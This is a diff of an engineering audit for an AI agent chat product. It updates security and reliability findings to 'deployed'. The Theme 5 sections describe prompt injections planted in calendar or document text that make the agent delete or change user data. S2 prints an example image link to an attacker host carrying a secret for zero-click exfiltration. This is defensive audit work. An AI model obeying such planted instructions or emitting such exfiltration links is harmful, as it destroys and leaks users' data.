@@ -17,7 +17,7 @@
 - `timing_metrics` has no RLS — create migration `20260130_235900` + the only other migration touching it (`20260428000015`, adds a column) confirm no `ENABLE ROW LEVEL SECURITY`. ✅
 - `prompt_cache_key` is never sent on the streaming path — `openrouter-v2-service.ts:1576-1588` omits it; it appears only on JSON/text/moonshot paths (`:905, :1226, :1432, :1681`). ✅
 
-**Status (updated 2026-08-30):** Waves 1 and 2 are committed. Wave 3 security is implemented in source; all three security/recovery migrations are applied in production, the bootstrap encryption key is configured, and fresh `public` + `libri` database types are generated. D4b is implemented with a service-only stale-turn cron, while the detached-lifecycle flag remains off in Production pending a Preview detach/reconcile smoke. Findings marked **FIXED/IMPLEMENTED** carry a one-line note on what shipped.
+**Status (updated 2026-08-30):** Waves 1 and 2 are committed. Wave 3 security is implemented and deployed; all three security/recovery migrations are applied in production, the bootstrap encryption key is configured, and fresh `public` + `libri` database types are generated. D4b is deployed with a service-only stale-turn cron scheduled from the effective `apps/web/vercel.json`; the protected 30-second Node route is live and its first verified production receipt succeeded with zero stale turns. The detached-lifecycle flag remains off in Production pending a Preview detach/reconcile smoke. Findings marked **FIXED/IMPLEMENTED** carry a one-line note on what shipped.
 
 ---
 
@@ -48,12 +48,12 @@ The auth/scope _core_ is genuinely well-built (fail-closed op allowlists, grant-
 | D9  | `prompt_cache_key` never forwarded on the primary streaming path (dead)                                                               | HIGH         | **FIXED (W1)** — `session_id`+key wired                                |
 | D10 | Cancelled/errored streams never log usage → billing undercount                                                                        | HIGH         | **FIXED (W1)** — logs `failure` row                                    |
 | D11 | Mid-stream OpenRouter `error` frames swallowed → truncated answer shipped as complete success                                         | HIGH         | **FIXED (W2)** — error frames throw                                    |
-| S1  | Prompt-injection → immediate data mutation, no human approval (commit-by-default in chat)                                             | **CRITICAL** | **IMPLEMENTED (W3, pending deploy)** — external-content write review   |
-| S2  | Markdown `<img>` renders remote URLs → zero-click exfiltration                                                                        | HIGH         | **IMPLEMENTED (W3, pending deploy)** — agent-only remote image block   |
-| S3  | On-demand tool materialization has no read/write gate; auto-executes destructive ops same-round                                       | HIGH         | **IMPLEMENTED (W3, pending deploy)** — scoped materialization gate     |
+| S1  | Prompt-injection → immediate data mutation, no human approval (commit-by-default in chat)                                             | **CRITICAL** | **DEPLOYED (W3, 2026-08-30)** — external-content write review          |
+| S2  | Markdown `<img>` renders remote URLs → zero-click exfiltration                                                                        | HIGH         | **DEPLOYED (W3, 2026-08-30)** — agent-only remote image block          |
+| S3  | On-demand tool materialization has no read/write gate; auto-executes destructive ops same-round                                       | HIGH         | **DEPLOYED (W3, 2026-08-30)** — scoped materialization gate            |
 | S4  | `timing_metrics` table has no RLS → cross-tenant metadata read/write                                                                  | HIGH         | **FIXED (W1, live verified 2026-08-30)** — owner/admin RLS             |
-| S5  | Bootstrap link stores plaintext bearer token at rest, never reaped                                                                    | HIGH         | **IMPLEMENTED (W3, migration applied; pending deploy)**                |
-| C1  | Ontology-context chats bypass the member-access gate → hydrate public projects you're not a member of                                 | HIGH         | **IMPLEMENTED (W3, pending deploy)** — authorize any projectId         |
+| S5  | Bootstrap link stores plaintext bearer token at rest, never reaped                                                                    | HIGH         | **DEPLOYED (W3; migration applied 2026-08-30)**                        |
+| C1  | Ontology-context chats bypass the member-access gate → hydrate public projects you're not a member of                                 | HIGH         | **DEPLOYED (W3, 2026-08-30)** — authorize any projectId                |
 | C2  | Client-supplied prewarm context trusted verbatim into system prompt + persisted (session poisoning)                                   | HIGH         | **FIXED (W3, verified 2026-08-29)** — unsigned payload ignored         |
 | O2  | `looksLikeExplicitMutationRequest` misfires both ways ("update me on…" nukes correct answers; "assign/postpone/merge" slip through)   | MEDIUM-HIGH  | CONFIRMED                                                              |
 | …   | (full set below, grouped by theme)                                                                                                    |              |                                                                        |
@@ -152,7 +152,7 @@ The client's supersede flow waits **≤120ms** for the cancel ack before sending
 
 **Fix:** persist each tool execution incrementally right after `onToolResult` (the callback already exists, `:3285`), keyed idempotently by `(turn_run_id, sequence)`; add a `last_progress_at` heartbeat on `chat_turn_runs` so a sweeper can distinguish dead vs alive.
 
-### D4b. Detached-turn survival is accidental — no `waitUntil`; detach path never closes the stream; sessions hard-block up to 285s — HIGH, CONFIRMED — IMPLEMENTED / PRODUCTION FLAG OFF
+### D4b. Detached-turn survival is accidental — no `waitUntil`; detach path never closes the stream; sessions hard-block up to 285s — HIGH, CONFIRMED — DEPLOYED / PRODUCTION FLAG OFF
 
 The turn runs in `void (async ()=>{})()` (`stream/+server.ts:1913`) after `return agentStream.response`. The only thing keeping the invocation alive is the un-closed `TransformStream` readable — **no `waitUntil` anywhere** in the agent stream path (the codebase knows the pattern; this route doesn't use it). On client disconnect the `finally` deliberately skips `agentStream.close()` (`:4337-4339`). A stuck `running` row blocks every new message ("still finishing the previous response") until age ≥ `FASTCHAT_DETACHED_TURN_MAX_DURATION_MS` (285s) — and only because the _next_ POST sweeps it; the client has no handler for `active_turn_running`.
 
@@ -166,8 +166,10 @@ preserves the old behavior. A `CRON_SECRET`-protected one-minute route calls the
 Legacy terminal updates are fenced to rows still `running`, preventing a thawed invocation from
 overwriting a reaper cancellation.
 Preview has `AGENT_CHAT_LEGACY_WAIT_UNTIL_ENABLED=true` staged for the runtime canary. Production
-intentionally has no such variable, so only the reaper ships active there until the Preview
-detach/reconcile smoke proves the lifecycle behavior on Vercel.
+intentionally has no such variable. The corrected Production deployment registers the effective
+`apps/web/vercel.json` schedule and the matching 30-second Node route; unauthenticated requests
+return 401, and the first verified receipt at `2026-08-30T17:01:04Z` succeeded with zero stale
+turns. The Preview detach/reconcile smoke remains before enabling the lifecycle flag in Production.
 
 ### D4c. `TurnObservabilityWriter.flush()` is dead code on the live path → nondeterministic loss of the rows D4's recovery depends on — MEDIUM, CONFIRMED — FIXED (W2)
 
@@ -197,7 +199,7 @@ The `finally` awaits only `flushTurnEvents()` (`stream/+server.ts:4336`), never 
 
 ## Theme 5 — Security (action side lacks the policy layer)
 
-### S1. Prompt-injection → immediate data mutation, no human approval — CRITICAL, IMPLEMENTED (W3, pending deploy)
+### S1. Prompt-injection → immediate data mutation, no human approval — CRITICAL, DEPLOYED (W3)
 
 Launch surfaces preload reads + writes together (`gateway-surface.ts:80-89` daily_brief→global_write, `:112-151` project_write/calendar); chat writes commit immediately (`ontology-write-executor.ts:1339-1404`); staging/review is opt-in and only for background Agent Runs (`dispatch.ts:179` `reviewRequired=false`; worker `agentRunWorker.ts:656-657`). `packages/shared-agent-ops/src/policy.ts` scope enforcement is **not** consulted on the chat path. So "mark all tasks done / delete the launch event" planted in a calendar description or shared doc body executes with zero approval when the user asks the brief/project chat anything.
 
@@ -211,7 +213,7 @@ change-set commit, and opaque MCP writes require a later explicit confirmation. 
 the exact reviewed operation to the confirmation prompt, and a confirmation turn cannot unlock a
 different write. Ordinary internal metadata reads do not add a review round.
 
-### S2. Markdown `<img>` renders remote URLs → zero-click exfiltration — HIGH, IMPLEMENTED (W3, pending deploy)
+### S2. Markdown `<img>` renders remote URLs → zero-click exfiltration — HIGH, DEPLOYED (W3)
 
 Assistant messages render via `{@html renderMarkdown(...)}` (`AgentMessageList.svelte:314,351`); `sanitizeOptions` allows `img[src]` with no scheme restriction (`utils/markdown.ts:39,50`). An injected instruction to emit `![](https://attacker/leak?d=SECRET)` auto-fetches attacker.com on render. Chains directly with S1.
 
@@ -222,7 +224,7 @@ allows relative BuildOS/data images but removes `http(s)` and protocol-relative 
 Uploaded user attachments remain on their separate first-party rendering path. Regression tests
 cover remote blocking and relative image preservation.
 
-### S3. On-demand tool materialization has no read/write gate; auto-executes destructive ops same-round — HIGH, IMPLEMENTED (W3, pending deploy)
+### S3. On-demand tool materialization has no read/write gate; auto-executes destructive ops same-round — HIGH, DEPLOYED (W3)
 
 `tool_search` searches the whole registry minus 4 read tools (`registry/tool-search.ts:85-148`); the on-miss path loads any tool by bare name and auto-runs it the same round (`stream-orchestrator/index.ts:1371-1466`); `materializeGatewayTools` filters only dedup + flag, no `kind:read|write` gate (`gateway-surface.ts:319-349`). `delete_calendar_event` is loadable+executable mid-turn from a nominally read-only context; the comment claiming deletes "keep their confirm-first path" is false (grep = 0 hits). The lean surface is a latency optimization, not a security boundary.
 
@@ -240,7 +242,7 @@ the exact reviewed operation.
 
 **Fix:** `ALTER TABLE timing_metrics ENABLE ROW LEVEL SECURITY;` + service-role ALL + `user_id = auth.uid()` policies. Live check: `select relrowsecurity from pg_class where relname='timing_metrics';`
 
-### S5/S8. Bootstrap bearer at rest + reusable setup link — HIGH/MEDIUM, IMPLEMENTED (W3, migration applied; pending deploy)
+### S5/S8. Bootstrap bearer at rest + reusable setup link — HIGH/MEDIUM, DEPLOYED (W3; migration applied)
 
 `agent-call/bootstrap-link.service.ts:176-184` inserts `payload:{ bearer_token }` in plaintext — the only unhashed copy of a `boca_` caller credential. Expired rows never deleted (410 on read, `:231-235`); retention cron reaps only OAuth artifacts; revoke doesn't clear the row. Also **S8: bootstrap link is multi-use within a 30-min TTL and the token travels in the URL path** fetched unauthenticated (`bootstrap/[setupToken]/+server.ts:10`), landing in CDN/proxy logs and agent transcripts.
 
@@ -265,7 +267,7 @@ scheduled from worker cleanup. Legacy plaintext rows remain readable only for th
 - **S16. `web_page_visits` cross-user shared body cache — MEDIUM, IMPLEMENTED (W3; migration applied).** Interactive chat and Agent Runs now read/write page bodies by `(user_id, normalized_url)`; RLS is owner-only and legacy unowned rows are inaccessible.
 - **S17. Production prompt-dump escape hatch — LOW/MEDIUM, FIXED (W3).** Filesystem prompt dumps fail closed whenever `dev` is false, regardless of environment flags.
 
-### C1. Ontology-context chats bypass the member-access gate — HIGH, IMPLEMENTED (W3, pending deploy)
+### C1. Ontology-context chats bypass the member-access gate — HIGH, DEPLOYED (W3)
 
 `isProjectScopedContext` returns true only for `project` (`scope.ts:52-56`), but `resolveRpcContextType` maps `ontology`+projectId to the `project` RPC path (`:72-82`). The stream/prewarm member-access gate runs only for project-scoped contexts (`stream/+server.ts:2049`, `prewarm/+server.ts:287`) — **not for `ontology`**. Migration `20260514002000` deliberately made the RPC require _member_ access, returning NULL for a non-member on a public project — but on NULL, `loadFastChatPromptContext` silently falls through to the manual-query branch (`context-loader.ts:2988-3001` → `loadProjectContextData`), which runs plain RLS-scoped selects, and RLS explicitly allows public reads (`project_select_public` etc.). So an authenticated non-member opens an `ontology` chat on a public project's id and hydrates its full seed bundle (description, tasks, goals, docs, START HERE). A non-UUID `focusEntityId` is a deliberate lever to force the fallback (no UUID validation at the boundary).
 
@@ -420,7 +422,7 @@ Implemented in three parallel tracks, all validated (51 targeted tests pass, `sv
     - **Gap 1 closed 2026-08-30:** dedicated disposable PostgreSQL regressions now verify that relationship/assignee failure rolls back the task and that an idempotency replay returns the original task without duplicate rows/edges.
     - **Gap 2 explicitly deferred:** the **project-instantiate** mitigation remains a broader design change. Child rows require the project FK/RLS parent to exist first, so project-row-last is not viable; a finalize flag needs a migration plus a fence in every project reader. Best-effort compensating cleanup remains.
 - **Carry-overs — SHIPPED.** D4 incremental persistence now gated on `buildRoundToolPattern([...]).hasWriteOps` (mutations only; per-read round-trip removed); the duplicate substring `isAbortLikeError` in `+server.ts` is deleted (outer handler relies on `signal.aborted`).
-- **D4b — IMPLEMENTED; PRODUCTION LIFECYCLE FLAG OFF.** The Node host uses pinned `@vercel/functions` `waitUntil`, detached closure requires confirmed registration, and a one-minute authenticated Vercel cron calls the applied bounded service-only reaper keyed by `COALESCE(last_progress_at, started_at)`. Automated contracts are green; a real Preview detach/reconcile smoke remains before enabling the Production flag.
+- **D4b — DEPLOYED; PRODUCTION LIFECYCLE FLAG OFF.** The Node host uses pinned `@vercel/functions` `waitUntil`, detached closure requires confirmed registration, and a one-minute authenticated Vercel cron calls the applied bounded service-only reaper keyed by `COALESCE(last_progress_at, started_at)`. The schedule lives in the effective `apps/web/vercel.json`; the protected Production route and first successful receipt are verified. A real Preview detach/reconcile smoke remains before enabling the Production flag.
 
 **Wave 2 tail to close before/with the next pass (small, do first):**
 
@@ -431,27 +433,27 @@ Implemented in three parallel tracks, all validated (51 targeted tests pass, `sv
 
 ---
 
-### Wave 3 — Security hardening (IMPLEMENTED IN SOURCE — migrations applied)
+### Wave 3 — Security hardening (DEPLOYED — migrations applied)
 
 **Why this is next:** with the data-integrity/durability cluster done, the highest-severity remaining findings are all security — including the only two remaining **CRITICALs** (S1) and the zero-click exfiltration (S2). The theme: _the action side of interactive chat lacks the policy layer that Agent Runs already have._ Run as three tracks. Track G (the injection chain) is the flagship and should be designed as one piece; Tracks H and I can parallelize once G's approach is set.
 
 **Track G — Close the prompt-injection → mutation/exfiltration chain (flagship; S1 + S3 + S2 are one problem).**
 
-- **S1 (CRITICAL) — IMPLEMENTED (W3, pending deploy):** last-boundary shared op classification, turn-local external-content review latch, destructive/opaque confirmation, and operation-bound confirmation turns. Internal metadata reads retain the fast path.
-- **S3 (HIGH) — IMPLEMENTED (W3, pending deploy):** discovery and on-miss materialization now consult the S1 policy, denied tools stay unmounted, and dispatch rechecks before same-round auto-execution. Confirmation narrows the write surface to the reviewed operation.
-- **S2 (HIGH) — IMPLEMENTED (W3, pending deploy):** assistant-only Markdown blocks automatic remote image loads while relative BuildOS/data images and separate uploaded attachments remain available.
+- **S1 (CRITICAL) — DEPLOYED (W3):** last-boundary shared op classification, turn-local external-content review latch, destructive/opaque confirmation, and operation-bound confirmation turns. Internal metadata reads retain the fast path.
+- **S3 (HIGH) — DEPLOYED (W3):** discovery and on-miss materialization now consult the S1 policy, denied tools stay unmounted, and dispatch rechecks before same-round auto-execution. Confirmation narrows the write surface to the reviewed operation.
+- **S2 (HIGH) — DEPLOYED (W3):** assistant-only Markdown blocks automatic remote image loads while relative BuildOS/data images and separate uploaded attachments remain available.
 - _Sequence:_ S2 first (self-contained, immediate), then S1+S3 together (shared design: the policy layer + a per-turn "external content ingested" flag that both the write gate and the materialization gate consult).
 
 **Track H — Access & trust boundaries (parallel with G once its design is set).**
 
-- **C1 (HIGH) — IMPLEMENTED (W3, pending deploy):** every resolved project is membership-checked in retained legacy/prewarm paths; project/focus identifiers are UUID-validated; project RPC failure is terminal.
+- **C1 (HIGH) — DEPLOYED (W3):** every resolved project is membership-checked in retained legacy/prewarm paths; project/focus identifiers are UUID-validated; project RPC failure is terminal.
 - **C2 (HIGH) — FIXED (W3, verified 2026-08-29):** unsigned client-carried prewarm data is ignored; only nonce-protected prepared prompts or server-owned/reloaded context can enter the prompt/cache path.
 - **S7 (MEDIUM) — FIXED (W3, verified 2026-08-29):** archived fallback requires explicit project scope and retains the soft-delete filter; direct gateway regressions cover both fences.
 
 **Track I — Abuse limits & secrets/PII hygiene (implemented; migration applied).**
 
 - **S6 (MEDIUM) — IMPLEMENTED (W3; migration applied):** per-user turn token bucket, atomic legacy running cap, existing worker capacity ceiling, and pre-auth IP limits for bootstrap/gateway.
-- **S5 / S8 (HIGH/MEDIUM) — IMPLEMENTED (W3, migration applied; pending deploy):** encrypted bearer payload, atomic single-use redemption, hardened response headers, and scheduled bounded cleanup.
+- **S5 / S8 (HIGH/MEDIUM) — DEPLOYED (W3; migration applied):** encrypted bearer payload, atomic single-use redemption, hardened response headers, and scheduled bounded cleanup.
 - **Hygiene sweep — IMPLEMENTED (W3; S11/S16 migration applied):** bounded/no-content logs, safe model errors, external-data transcript wrappers, scheduled prompt/tool/event retention, retired duplicate dumps, service-only observability DML, per-user page-body cache, and dev-only filesystem prompt dumps.
 
 **Suggested Wave 3 sequencing:** close the Wave 2 tail (above) → **S2** (immediate) → design + build **S1+S3** (flagship, one PR or a tight set) → Tracks H and I in parallel. Keep S1's policy-layer change and each migration in their own reviewable PRs. Consider pulling **Wave 5 observability** forward to run alongside, so the injection-defense and rate-limit changes are measurable.
